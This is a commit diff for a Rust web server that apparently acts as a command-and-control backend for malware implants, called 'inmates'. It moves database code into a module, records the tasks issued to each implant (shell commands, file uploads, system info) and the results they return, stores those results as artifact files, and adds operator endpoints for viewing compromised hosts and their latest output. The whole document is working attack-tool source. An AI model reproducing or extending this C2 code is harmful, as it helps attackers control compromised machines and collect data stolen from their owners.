5610ac050032d514e0b063133d01719b13b8aff4
Mark Wilkinson <markwilkinson.141@gmail.com>
2025-01-13 10:15:01 -0800

    Implement database functionality for inmate management

---
+++ src/db.rs
@@ -0,0 +1,84 @@
+use Justice::Inmate;
+use Justice::actions::c2_actions;
+use rusqlite::{Connection, Result, params};
+use std::time::SystemTime;
+
+pub fn create_db() {
+    let conn = Connection::open("prisoninmates.db");
+    match conn {
+        Ok(conn) => {
+           match conn.execute(
+                "CREATE TABLE IF NOT EXISTS inmates (
+                    rowid INTEGER PRIMARY KEY,
+                    os TEXT,
+                    hostname TEXT,
+                    ip TEXT,
+                    pid INTEGER,
+                    last_checkin INTEGER,
+                    pending_instruct TEXT,
+                    pending_instruct_type TEXT,
+                    request_actions TEXT,
+                    completed_actions TEXT
+                )",
+                [],
+            ) {
+                Ok(_) => {
+                    {}
+                }
+                Err(_) => {
+                    panic!("Error creating table");
+                }
+            }
+        },
+        Err(_) => {
+            panic!("Error creating database, make sure you can write a file to the current directory, or modify the path");
+        }
+    }
+}
+
+pub fn implant_exists(implant_id: u32) -> Result<Inmate, &'static str> {
+    let inmates = get_all_inmates();
+    for inmate in inmates {
+        if inmate.rowid == implant_id {
+            return Ok(inmate);
+        }
+    }
+    return Err("Does not exist")
+}
+
+pub fn update_database(inmate: Inmate) {
+    let conn = Connection::open("prisoninmates.db").unwrap();
+    let _ = conn.execute(
+        "UPDATE inmates SET os = ?1, hostname = ?2, ip = ?3, pid = ?4, last_checkin = ?5, pending_instruct = ?6, pending_instruct_type = ?7, request_actions = ?8, completed_actions = ?9 WHERE rowid = ?10",
+        params![inmate.os, inmate.hostname, inmate.ip, inmate.pid, SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), inmate.pending_instruct, inmate.pending_instruct_type.to_string(), serde_json::to_string(&inmate.request_actions).unwrap(), serde_json::to_string(&inmate.completed_actions).unwrap(), inmate.rowid]
+    );
+}
+
+pub fn get_all_inmates() -> Vec<Inmate> {
+    let conn = Connection::open("prisoninmates.db").unwrap();
+    let mut stmt = conn.prepare("SELECT * FROM inmates").unwrap();
+    let mut inmate_iter = stmt.query_map([], |row| {
+        let instr_type: String = row.get(7)?;
+        let request_act: String = row.get(8)?;
+        let completed_act: String = row.get(9)?;
+
+        Ok(Inmate {
+            rowid: row.get(0)?,
+            os: row.get(1)?,
+            hostname: row.get(2)?,
+            ip: row.get(3)?,
+            pid: row.get(4)?,
+            last_checkin: row.get(5)?,
+            pending_instruct: row.get(6)?,
+            pending_instruct_type: instr_type.parse::<c2_actions>().unwrap(),
+            request_actions: serde_json::from_str(&request_act).unwrap(),
+            completed_actions: serde_json::from_str(&completed_act).unwrap(),
+        })
+    }).unwrap();
+    let mut all_inmates: Vec<Inmate> = Vec::new();
+    for inmate in inmate_iter {
+        let inmate_unwrapped = inmate.unwrap();
+        all_inmates.push(inmate_unwrapped);
+    }
+    return all_inmates;
+}
--- src/main.rs
+++ src/main.rs
@@ -6,42 +6,12 @@ use serde_json;
 use Justice::CheckInResponse;
 use Justice::PostRequest;
 use Justice::Inmate;
+use Justice::PostRequestHeaders;
 use rusqlite::{Connection, Result, params};
 use std::time::SystemTime;
 use std::fs;
-
-
-
-fn create_db() {
-    let conn = Connection::open("prisoninmates.db");
-    match conn {
-        Ok(conn) => {
-           match conn.execute(
-                "CREATE TABLE IF NOT EXISTS inmates (
-                    rowid INTEGER PRIMARY KEY,
-                    os TEXT,
-                    hostname TEXT,
-                    ip TEXT,
-                    pid INTEGER,
-                    last_checkin INTEGER,
-                    pending_instruct TEXT,
-                    pending_instruct_type TEXT
-                )",
-                [],
-            ) {
-                Ok(_) => {
-                    {}
-                }
-                Err(_) => {
-                    panic!("Error creating table");
-                }
-            }
-        },
-        Err(_) => {
-            panic!("Error creating database, make sure you can write a file to the current directory, or modify the path");
-        }
-    }
-}
+mod db;
+use db::{implant_exists, update_database, get_all_inmates, create_db};
 
 #[get("/")]
 fn index() -> &'static str {
@@ -54,45 +24,23 @@ fn handle_c2_request(implant_id: u32, c2_request: Json<PostRequest>) -> &'static
     match implant_exists(implant_id) {
         Ok(inmate) => {
             let request = c2_request.into_inner();
+            let request_headers = PostRequestHeaders {
+                timestamp: request.timestamp,
+                action_type: request.action_type,
+                action_parameters: request.action_parameters,
+            };
+
+            let mut new_inmate = inmate.clone();
+            new_inmate.completed_actions.push(request_headers);
+            update_database(new_inmate);
+            
             //println!("{} performed action {:?}, result: {}", implant_id, request.action_type, String::from_utf8(&request.content).unwrap());
             let timestamp = &request.timestamp;
             let dir_path = format!("artifacts/{}/{}", implant_id, &request.action_type.to_string());
             fs::create_dir_all(&dir_path).unwrap();
             let file_path = format!("{}/{}", dir_path, timestamp);
             fs::write(file_path, request.content).unwrap();
-            /* 
-            match request.action_type {
-                c2_actions::ShellCommand => {
-                    let command = request.action_parameters;
-                    let output = Command::new("sh")
-                        .arg("-c")
-                        .arg(command)
-                        .output()
-                        .expect("failed to execute process");
-                    let conn = Connection::open("prisoninmates.db").unwrap();
-                    let _ = conn.execute(
-                        "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
-                        params![String::from_utf8(output.stdout).unwrap(), "ShellCommand", implant_id]
-                    );
-                }
-                c2_actions::FileUpload => {
-                    let conn = Connection::open("prisoninmates.db").unwrap();
-                    let _ = conn.execute(
-                        "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
-                        params!["FileUpload", implant_id]
-                    );
-                }
-                c2_actions::Wait => {
-                    let conn = Connection::open("prisoninmates.db").unwrap();
-                    let _ = conn.execute(
-                        "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
-                        params!["", "Wait", implant_id]
-                    );
-                }
-                _ => {
-                    println!("Unknown action type");
-                }
-            }*/
+
         }
         Err(_) => {
             println!("Unknown implant tried to post, id: {}", implant_id);
@@ -106,26 +54,31 @@ fn get_c2_request(implant_id: u32) -> Json<CheckInResponse> {
     
     match implant_exists(implant_id) {
         Ok(inmate) => {
-            let conn = Connection::open("prisoninmates.db").unwrap();
-            let _ = conn.execute(
-                "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
-                params!["", "wait", implant_id]
-            );
-            return Json(CheckInResponse {
+
+            let mut new_inmate = inmate.clone();
+
+            let response = CheckInResponse {
                 task: inmate.pending_instruct_type,
                 task_parameters: inmate.pending_instruct,
-            })
+            };
+            if !(response.task == c2_actions::Wait) {
+                new_inmate.request_actions.push(response.clone());
+            }
+
+            update_database(new_inmate);
+
+            return Json(response);
         }
         Err(_) => {
             let conn = Connection::open("prisoninmates.db").unwrap();
             let _ = conn.execute(
                 "INSERT INTO inmates (rowid, os, hostname, ip, pid, last_checkin, pending_instruct, pending_instruct_type) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
-                params![implant_id, "Unknown", "Unknown", "TBD", 1234, SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), "", "wait"]
+                params![implant_id, "Unknown", "Unknown", "TBD", 1234, SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), "", "SystemInfo"]
             );
             println!("Implant registered id: {}", implant_id);
             fs::create_dir_all(format!("artifacts/{}", implant_id)).unwrap();
             return Json(CheckInResponse {
-                task: c2_actions::SystemInfo,
+                task: c2_actions::Wait,
                 task_parameters: "".to_string(),
             });
         }
@@ -134,58 +87,58 @@ fn get_c2_request(implant_id: u32) -> Json<CheckInResponse> {
 
 #[get("/operator")]
 fn operator_panel() -> Json<String> {
-    let conn = Connection::open("prisoninmates.db").unwrap();
-    let mut stmt = conn.prepare("SELECT * FROM inmates").unwrap();
-    let mut inmate_iter = stmt.query_map([], |row| {
-        let instr_type: String = row.get(7)?;
-        Ok(Inmate {
-            rowid: row.get(0)?,
-            os: row.get(1)?,
-            hostname: row.get(2)?,
-            ip: row.get(3)?,
-            pid: row.get(4)?,
-            last_checkin: row.get(5)?,
-            pending_instruct: row.get(6)?,
-            pending_instruct_type: instr_type.parse::<c2_actions>().unwrap(),
-        })
-    }).unwrap();
-    let mut all_inmates: Vec<Inmate> = Vec::new();
-    for inmate in inmate_iter {
-        let inmate_unwrapped = inmate.unwrap();
-        all_inmates.push(inmate_unwrapped);
-    }
+    let all_inmates = get_all_inmates();
 
     return Json(serde_json::to_string(&all_inmates).unwrap());
 }
 
-fn implant_exists(implant_id: u32) -> Result<Inmate, &'static str> {
-    let conn = Connection::open("prisoninmates.db").unwrap();
-    let mut stmt = conn.prepare("SELECT * FROM inmates").unwrap();
-    
-    let inmate_iter = stmt.query_map([], |row| {
-        let instr_type: String = row.get(7)?;
-        Ok(Inmate {
-            rowid: row.get(0)?,
-            os: row.get(1)?,
-            hostname: row.get(2)?,
-            ip: row.get(3)?,
-            pid: row.get(4)?,
-            last_checkin: row.get(5)?,
-            pending_instruct: row.get(6)?,
-            pending_instruct_type: instr_type.parse::<c2_actions>().unwrap(),
-        })
-    }).unwrap();
-    for inmate in inmate_iter {
-        let inmate_unwrapped = inmate.unwrap();
-        if inmate_unwrapped.rowid == implant_id {
-            let _ = conn.execute(
-                "UPDATE inmates SET last_checkin = ?1 WHERE rowid = ?2",
-                params![SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), implant_id]
-            );
-            return Ok(inmate_unwrapped)
+#[get("/operator/<implant_id>")]
+fn operator_panel_specific(implant_id: u32) -> Json<String> {
+    let inmate = implant_exists(implant_id);
+    match inmate {
+        Ok(inmate) => {
+            return Json(serde_json::to_string(&inmate).unwrap());
+        }
+        Err(_) => {
+            return Json("Does not exist".to_string());
         }
     }
-    return Err("Does not exist")
+}
+
+#[get("/operator/<implant_id>/recent")]
+fn operator_panel_specific_recent(implant_id: u32) -> Result<Json<PostRequest>, Json<String>> {
+    let inmate = implant_exists(implant_id);
+    match inmate {
+        Ok(inmate) => {
+            let recent_action = inmate.completed_actions.last();
+            match recent_action {
+                Some(action) => {
+                    let file_path = format!("artifacts/{}/{}/{}", implant_id, action.action_type.to_string(), action.timestamp);
+                    match fs::read(&file_path) {
+                        Ok(content) => {
+                            Ok(Json(PostRequest {
+                                timestamp: action.timestamp,
+                                action_type: action.action_type,
+                                action_parameters: action.action_parameters.clone(),
+                                content,
+                            }))
+                        },
+                        Err(_) => Err(Json("Failed to read the file containing output, check permissions".to_string())),
+                    }
+                }
+                None => Err(Json("No recent action found".to_string())),
+            }
+        }
+        Err(_) => {
+            Err(Json("Does not exist".to_string()))
+        }
+    }
+}
+
+#[post("/operator", data = "<request>")]
+fn operator_panel_post(request: Json<String>) -> &'static str {
+    let apiRequest = request.into_inner();
+    "Ok"
 }
  
 #[launch]
@@ -196,4 +149,7 @@ fn rocket() -> _ {
         .mount("/", routes![handle_c2_request])
         .mount("/", routes![get_c2_request])
         .mount("/", routes![operator_panel])
+        .mount("/", routes![operator_panel_specific])
+        .mount("/", routes![operator_panel_post])
+        .mount("/", routes![operator_panel_specific_recent])
 }
